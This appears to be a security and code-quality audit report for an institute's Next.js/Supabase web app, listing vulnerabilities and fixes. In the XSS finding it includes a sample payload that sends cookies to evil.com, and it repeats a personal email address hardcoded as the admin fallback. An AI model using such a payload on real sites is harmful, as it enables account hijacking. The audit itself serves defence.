# 🔍 Institute1 Codebase Audit Report
## Redundant Files, Security Bugs & Code Quality Issues

> **Audited:** `D:\Institute\institute1\src\` — 102 source files, 59 SQL migrations
> **Date:** July 5, 2026 | **Severity Scale:** 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low

---

## Summary Dashboard

| Category | 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low | Total |
|:---|:---:|:---:|:---:|:---:|:---:|
| **Security Vulnerabilities** | 2 | 3 | 2 | 1 | **8** |
| **Redundant / Dead Files** | — | 1 | 3 | 2 | **6** |
| **Code Quality Issues** | — | — | 3 | 2 | **5** |
| **TOTAL** | **2** | **4** | **8** | **5** | **19** |

---

## 🔴 CRITICAL Security Vulnerabilities

### SEC-01: XSS (Cross-Site Scripting) via `dangerouslySetInnerHTML`
| | |
|:---|:---|
| **Severity** | 🔴 **CRITICAL** |
| **File** | [feedbacks/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/feedbacks/page.tsx#L107) |
| **Line** | 107 |

**The Bug:**
```tsx
// Line 107 — DANGEROUS: fb.message comes from the database WITHOUT sanitization
<p style={{ margin: 0 }} dangerouslySetInnerHTML={{ __html: fb.message }} />
```

**Attack Scenario:**
1. Admin creates a "Notification" type feedback with message: `<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">`
2. Every student who opens the Feedbacks page executes this script
3. Attacker steals session cookies, can hijack any student account

**Fix:**
```tsx
// Option 1: Use DOMPurify to sanitize
import DOMPurify from 'dompurify';
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(fb.message) }} />

// Option 2: Don't use dangerouslySetInnerHTML at all (PREFERRED)
<p style={{ margin: 0 }}>{fb.message}</p>
```

> Note: `LessonView.tsx` (line 83) also uses `dangerouslySetInnerHTML` but sanitizes first (`sanitizedNotes`). feedbacks page does NOT sanitize.

---

### SEC-02: Service Role Key Used in Student-Accessible Pages
| | |
|:---|:---|
| **Severity** | 🔴 **CRITICAL** |
| **Files** | 3 files |

The `SUPABASE_SERVICE_ROLE_KEY` bypasses ALL Row-Level Security policies. It's used in pages accessible to students:

| File | Line | Risk |
|:---|:---|:---|
| [users/[id]/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/users/[id]/page.tsx#L68) | 68 | Student can view any other user's enrollments (bypasses RLS) |
| [instructor/submissions/page.tsx](file:///D:/Institute/institute1/src/app/(instructor)/instructor/submissions/page.tsx#L25) | 25, 73 | Instructor page uses service role for submissions |
| [adminActions.ts](file:///D:/Institute/institute1/src/features/admin/actions/adminActions.ts#L10) | 10 | Admin actions (expected, but no audit logging) |

**The Risk:** These are Server Components, so the key isn't exposed to the browser. However, using service role in student-accessible pages means **any data query in those pages bypasses RLS** — if a developer accidentally writes a broader query, it returns ALL data, not just the user's.

**Fix:** Use the authenticated Supabase client (with RLS) and create proper RLS policies instead of bypassing them.

---

## 🟠 HIGH Security Vulnerabilities

### SEC-03: Hardcoded Super Admin Email with Client Bundle Leak
| | |
|:---|:---|
| **Severity** | 🟠 **HIGH** |
| **File** | [constants.ts](file:///D:/Institute/institute1/src/lib/constants.ts#L17) |

```typescript
// Line 17 — The fallback email is HARDCODED and shipped to ALL clients
export const SUPER_ADMIN_EMAIL = process.env.SUPER_ADMIN_EMAIL || 'iambestadi@gmail.com';
```

**Problems:**
1. This constant is imported in **15+ files** including `Sidebar.tsx`, `Navbar.tsx`, `leaderboard/page.tsx` — some of which are client components
2. If `process.env.SUPER_ADMIN_EMAIL` is missing (common in local dev), the fallback leaks your email
3. [leaderboard/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/leaderboard/page.tsx#L59) Line 59 still has a **second hardcoded copy**: `fac.email === 'iambestadi@gmail.com'`

**Fix:** Move admin email check to server-only code. Never import this constant in client components.

---

### SEC-04: No CSRF (Cross-Site Request Forgery) Protection
| | |
|:---|:---|
| **Severity** | 🟠 **HIGH** |
| **Scope** | All Server Actions |

Searched entire codebase: **0 results for `csrf` or `xsrf`**. Server Actions in Next.js have some built-in CSRF protection via Same-Origin headers, but your custom API routes (`/api/auth/callback`) have none.

**Fix:** Add CSRF token validation for sensitive API routes (password reset, role changes, admin actions).

---

### SEC-05: Weak Password Policy
| | |
|:---|:---|
| **Severity** | 🟠 **HIGH** |
| **File** | [auth.ts](file:///D:/Institute/institute1/src/features/auth/actions/auth.ts#L26) |

```typescript
// Line 26-27 — Only 6 characters minimum, no complexity requirements
if (password.length < 6) {
  return { error: 'Password must be at least 6 characters' };
}
```

**Missing:** No uppercase, lowercase, number, or special character requirements. "123456" is a valid password.

**Fix:**
```typescript
const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
if (!passwordRegex.test(password)) {
  return { error: 'Password must be 8+ chars with uppercase, lowercase, number, and special character' };
}
```

---

## 🟡 MEDIUM Issues

### SEC-06: Admin Authorization via Email Comparison Only
| | |
|:---|:---|
| **Severity** | 🟡 **MEDIUM** |
| **Files** | 8+ files |

Admin access is checked by comparing `user.email === SUPER_ADMIN_EMAIL` in many places instead of checking the `role` column:

```typescript
// instructor-actions.ts Line 13
if (!user || user.email !== SUPER_ADMIN_EMAIL) { ... }

// admin/feedback/page.tsx Line 15
if (!user || user.email !== SUPER_ADMIN_EMAIL) { ... }
```

**Risk:** If someone gains access to the admin email, they bypass all role-based checks. The `role` column in the database is the true source of authority.

**Fix:** Check `profile.role === 'admin'` instead of comparing emails. Only use email comparison as a secondary super-admin check.

---

### SEC-07: No Input Length Validation on Text Fields
| | |
|:---|:---|
| **Severity** | 🟡 **MEDIUM** |
| **Scope** | Doubts, Feedbacks, Notices |

Server actions accept text inputs without max-length validation. A malicious user could:
- Submit a 10MB doubt message → fills database storage
- Submit 1000s of feedback entries → storage exhaustion

**Fix:** Add `if (message.length > 5000) return { error: 'Too long' }` to all text input actions.

---

### SEC-08: Missing Rate Limiting on Critical Actions
| | |
|:---|:---|
| **Severity** | 🟡 **MEDIUM** |

Rate limiting exists only on 3 actions. Many critical actions have NONE:

| Action | Has Rate Limit? |
|:---|:---|
| Sign Up | ✅ 5/10min |
| Sign In | ✅ 10/5min |
| Submit Feedback | ✅ 3/min |
| Submit Assignment | ✅ 5/min |
| Ask Doubt | ❌ No limit |
| Reply to Doubt | ❌ No limit |
| Enroll in Course | ❌ No limit |
| Admin Role Changes | ❌ No limit |
| Toggle Likes | ❌ No limit |
| Password Reset Request | ❌ No limit (can spam emails) |

**Fix:** Add `checkRateLimit()` to all remaining write actions.

---

## 📁 Redundant & Dead Files

### RED-01: Dummy Certificate Page (Test/Dev Code in Production)
| | |
|:---|:---|
| **Severity** | 🟠 **HIGH** — exposes test data to users |
| **File** | [certificates/dummy/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/certificates/dummy/page.tsx) |

This page is accessible at `/certificates/dummy` by any logged-in student. It displays:
- Hardcoded `studentName = 'Your Name Here'`
- Hardcoded `instituteId = 'YOUR-INSTITUTE-ID'`
- Hardcoded `XP = 1250, Rank = #1, Tasks = 15/15`
- No auth guard — any student can access

**Action:** Delete this file entirely or add auth guard + hide from navigation.

---

### RED-02: Duplicate Layout Code (3× Copy-Paste)
| | |
|:---|:---|
| **Severity** | 🟡 **MEDIUM** — code duplication |

Three nearly identical layout files:

| File | Lines | Purpose |
|:---|:---|:---|
| [(dashboard)/layout.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/layout.tsx) | ~67 | Student layout |
| [(admin)/layout.tsx](file:///D:/Institute/institute1/src/app/(admin)/layout.tsx) | ~67 | Admin layout |
| [(instructor)/layout.tsx](file:///D:/Institute/institute1/src/app/(instructor)/layout.tsx) | ~72 | Instructor layout |

All three have:
- Same auth check (lines 13-18)
- Same "Profile Not Found" error UI (lines 23-38)
- Same `getOrCreateProfile()` call
- Same Sidebar + Navbar rendering

**Action:** Extract shared layout into a reusable `AuthenticatedLayout` component.

---

### RED-03: Duplicate Hardcoded Email
| | |
|:---|:---|
| **Severity** | 🟡 **MEDIUM** |
| **File** | [leaderboard/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/leaderboard/page.tsx#L59) |

```typescript
// Line 59 — hardcoded AGAIN even though SUPER_ADMIN_EMAIL constant exists
const developer = rawAdmins.find(fac => fac.email === 'iambestadi@gmail.com');
// Line 61 — hardcoded AGAIN
fac => fac.email !== 'iambestadi@gmail.com' && fac.email !== SUPER_ADMIN_EMAIL
```

Imports `SUPER_ADMIN_EMAIL` but also hardcodes the email separately. If the env var changes, these lines break.

---

### RED-04: Unused Variable `notificationCount`
| | |
|:---|:---|
| **Severity** | 🟢 **LOW** |
| **File** | [feedbacks/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/feedbacks/page.tsx#L31) |

`notificationCount` is declared at line 31 and incremented inside the loop, but it's never displayed or used for any meaningful logic. Only used to track if count ≤ 5 for "New" badge, but this logic is fragile (depends on render order).

---

### RED-05: `console.log` / `console.error` in Production
| | |
|:---|:---|
| **Severity** | 🟢 **LOW** — information leak in browser console |

| File | Line | Statement |
|:---|:---|:---|
| [PwaRegister.tsx](file:///D:/Institute/institute1/src/components/PwaRegister.tsx#L11) | 11, 14 | `console.log('ServiceWorker registration...')` |
| [BadgeCelebrator.tsx](file:///D:/Institute/institute1/src/components/shared/BadgeCelebrator.tsx#L14) | 14 | `console.log('Fetched unseen badges:', data)` |
| [users/[id]/page.tsx](file:///D:/Institute/institute1/src/app/(dashboard)/users/[id]/page.tsx#L35) | 35, 40, 87 | `console.error(...)` in 3 places |

**Action:** Remove all `console.log` in production. Replace `console.error` with a proper error logging service (Sentry).

---

## 🔧 Code Quality Issues

### CQ-01: `company_settings` Fetched 3× Per Page Load
Each layout (`admin`, `instructor`, `dashboard`) independently fetches `company_settings`. When a user navigates within admin, the layout re-fetches this on every route change.

**Fix:** Fetch once in root layout and pass via React Context.

---

### CQ-02: `select('*')` on company_settings
```typescript
// (admin)/layout.tsx Line 46
const { data: settings } = await supabase.from('company_settings').select('*').single();
```
`select('*')` fetches ALL columns even though only `company_name` and `logo_url` are used.

**Fix:** `select('company_name, logo_url')`

---

### CQ-03: `any` Type Used Extensively
```typescript
// users/[id]/page.tsx Line 175
{enrollments.map((enr: any) => (
// Line 303
{teachingCourses.map((tc: any) => (
```
Multiple files use `any` type, defeating TypeScript's purpose.

---

### CQ-04: Inline Styles Instead of CSS Classes
Almost every page uses extensive inline `style={{...}}` objects (100+ instances). This:
- Bloats the JavaScript bundle
- Makes styling inconsistent
- Defeats CSS caching

---

### CQ-05: No Error Boundary Components
If any Server Component throws, the entire page crashes. There are no `error.tsx` boundary files in any route segment.

---

## 📋 Fix Priority Matrix

| Priority | Issue ID | Effort | Impact |
|:---|:---|:---|:---|
| **Fix NOW** | SEC-01 (XSS) | 5 min | Prevents account hijacking |
| **Fix NOW** | SEC-02 (Service Role Key) | 30 min | Prevents RLS bypass |
| **Fix This Week** | SEC-05 (Password Policy) | 10 min | Prevents weak passwords |
| **Fix This Week** | RED-01 (Dummy Certificate) | 2 min | Remove test page |
| **Fix This Week** | RED-05 (console.log) | 5 min | Clean production output |
| **Fix This Week** | SEC-08 (Rate Limiting) | 30 min | Prevent abuse |
| **Fix Soon** | SEC-03 (Hardcoded Email) | 15 min | Prevent info leak |
| **Fix Soon** | SEC-06 (Email Auth) | 1 hr | Proper RBAC |
| **Fix Soon** | RED-02 (Duplicate Layouts) | 1 hr | Reduce duplication |
| **Backlog** | CQ-01 to CQ-05 | Various | Code quality improvement |

---

> **Total estimated fix time: ~4 hours** for all critical and high issues.
